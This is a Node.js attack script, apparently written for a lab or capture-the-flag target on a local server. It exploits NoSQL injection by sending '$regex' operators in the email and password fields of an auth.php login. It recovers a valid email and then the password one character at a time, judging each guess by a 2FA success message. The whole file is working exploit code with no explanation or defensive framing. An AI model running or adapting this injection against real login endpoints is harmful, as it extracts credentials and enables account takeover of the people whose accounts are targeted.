const http = require('http');

let email = "";
let password = "";
let prevEmailLength = 0;
let prevPasswordLength = 0;
const url = "http://127.0.0.1:8008/auth.php";
const headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
};
// const printable = [...Array(127).keys()].map(i => String.fromCharCode(i)).join('');
const printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';

async function sendRequest(payload) {
    const options = {
        method: 'POST',
        headers: headers,
        rejectUnauthorized: false,
        allowRedirects: false
    };
    return new Promise((resolve, reject) => {
        const req = http.request(url, options, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: data
                });
            });
        });
        req.on('error', (err) => {
            reject(err);
        });
        req.write(payload);
        req.end();
    });
}

async function findValidEmail() {
    while (true) {
        let foundValidMailChar = false;
        for (const c of printable) {
            if (!['*', '+', '.', '?', '|', '&', '$', '\r', '\n', '\t', '\v'].includes(c)) {
                const payload = `email[$regex]=^${email + c}&password[$regex]=^`;
                const res = await sendRequest(payload);
                if (res.body.includes('Check your inbox for an email with your 2FA token')) {
                    email += c;
                    foundValidMailChar = true;
                    // console.log(`Found one more char for email: ${email}`);
                }
            }
        }
        if (email.length === prevEmailLength || !foundValidMailChar) {
            break;
        }
        prevEmailLength = email.length;
    }
}


async function findValidPassword() {
    while (true) {
        let foundValidPassChar = false;
        for (const c of printable) {
            if (!['*', '+', '.', '?', '|', '&', '$', '\r', '\n', '\t', '\v'].includes(c)) {
                const payload = `email[$regex]=^${email}&password[$regex]=^${password + c}`;
                const res = await sendRequest(payload);
                if (res.body.includes('Check your inbox for an email with your 2FA token')) {
                    password += c;
                    foundValidPassChar = true;
                    // console.log(`Found one more char: ${password + c}`);
                }
            }
        }
        if (!foundValidPassChar || password.length === prevPasswordLength) {
            break;
        }
        prevPasswordLength = password.length;
    }
}

(async function () {
    await findValidEmail();
    console.log(`Valid email found: ${email}`);
    await findValidPassword();
    console.log(`Valid password found: ${password}`);
})();
